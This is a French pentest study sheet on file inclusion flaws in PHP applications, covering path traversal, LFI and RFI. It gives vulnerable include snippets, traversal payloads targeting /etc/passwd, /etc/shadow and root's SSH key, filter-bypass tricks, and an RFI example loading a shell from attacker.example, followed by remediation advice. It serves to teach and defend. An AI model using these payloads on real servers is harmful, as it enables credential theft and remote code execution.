## Quoi / définition

- **File inclusion** : vulnérabilité où une appli web inclut/retourne des fichiers à partir d’un paramètre contrôlé par l’utilisateur (ex. `?file=...`).
- Trois formes principales :
    - **Path traversal / Directory traversal** (`../` — lire fichiers hors du webroot).
    - **LFI (Local File Inclusion)** — inclure des fichiers locaux (exécution possible si fichier PHP inclus).
    - **RFI (Remote File Inclusion)** — inclure des fichiers distants via URL (nécessite `allow_url_fopen` / `allow_url_include`).
---
## Pourquoi ça arrive
- Mauvaise **validation/sanitation** des entrées utilisateur.
- Utilisation directe d’appels type `include`, `require`, `file_get_contents`, etc. avec des paramètres non filtrés.
- Erreurs affichées côté serveur qui divulguent des chemins et le comportement de l’application.

---
## Risques principaux
- **Divulgation d’informations sensibles** ( `/etc/passwd`, clés SSH, fichiers de configuration).
- **Escalade vers RCE** si l’attaquant peut écrire un fichier ou inclure un script distant (RFI).
- **XSS, DoS**, et compromission complète du serveur web.

---
## Comportement typique & indices
- Paramètre visible : `http://site/get.php?file=userCV.pdf`
- Erreur révélatrice (exemple) :  
    `Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12` → montre `include(languages/...)` et le chemin complet.
- PHP souvent concatène une extension (`.php`) automatiquement → nécessite contournements.

---

## Exemples concrets (cheat-sheet)

### PHP vulnérable
```php
// vulnérable
include($_GET['lang']);
```
Inclusion simple : `?lang=/etc/passwd` (si autorisé).
### Insertion de répertoire forcé
```php
include("languages/". $_GET['lang']);
```
Payload LFI classique :  
`?lang=../../../../etc/passwd`
### Contournements / bypass courants

- **Dot-dot-slash** : `../../..` pour remonter l’arborescence.
- **Null byte** (historique) : `%00` pour tronquer la chaîne (ne fonctionne plus sur PHP ≥ 5.3.4).  
    Exemple : `../../../../etc/passwd%00`
- **Slash/point tricks** : ajouter `/.` ou `/..` après le fichier filtré : `/etc/passwd/.` ou `/etc/passwd/..`
- **Obfuscation pour filtres naïfs** : `....//....//etc/passwd` (remplace uniquement `../` simple)
- **Forcer inclusion de répertoire** : si l’appli exige `languages/EN.php`, faire `?lang=languages/../../../../../etc/passwd`
### RFI
- Si `allow_url_fopen`/`allow_url_include` activés :  
    `?lang=http://attacker.example/shell.txt` où `shell.txt` contient PHP malveillant.
---

## Fichiers utiles à tester (Linux / Windows)

- Linux : `/etc/passwd`, `/etc/shadow`, `/proc/version`, `/root/.bash_history`, `/var/log/apache2/access.log`, `/root/.ssh/id_rsa`
- Windows : `C:\boot.ini`, `C:\windows\win.ini`
---

## Détection / signes en pentest

- Messages d’erreur révélant chemins complets.
- Comportement différent selon l’ajout de `../` ou d’un nom de fichier non attendu.
- Serveur effectuant requêtes sortantes vers des hôtes contrôlés par l’attaquant (pour RFI).

---

## Contre-mesures / remediation (checklist)

1. **Ne jamais** inclure directement de données utilisateur.
2. **Whitelisting** : n’autoriser que des noms/fichiers connus (p.ex. table `['EN','FR']`) plutôt que blacklist.
3. **Validation stricte** : valider type, format et chemin canonique.
4. **Désactiver** `allow_url_fopen` et `allow_url_include` si non nécessaires.
5. **Désactiver l’affichage des erreurs** en prod (éviter fuite de chemins).
6. **Utiliser des chemins absolus contrôlés** (pas de concaténation côté client).
7. **Chroot / permissions minimales** : restreindre ce que le processus web peut lire/écrire.
8. **WAF** et règles de détection pour patterns `../`, URL externes incluses, etc.
9. **Logging & audits** : détecter tentatives de traversal / inclusions anormales.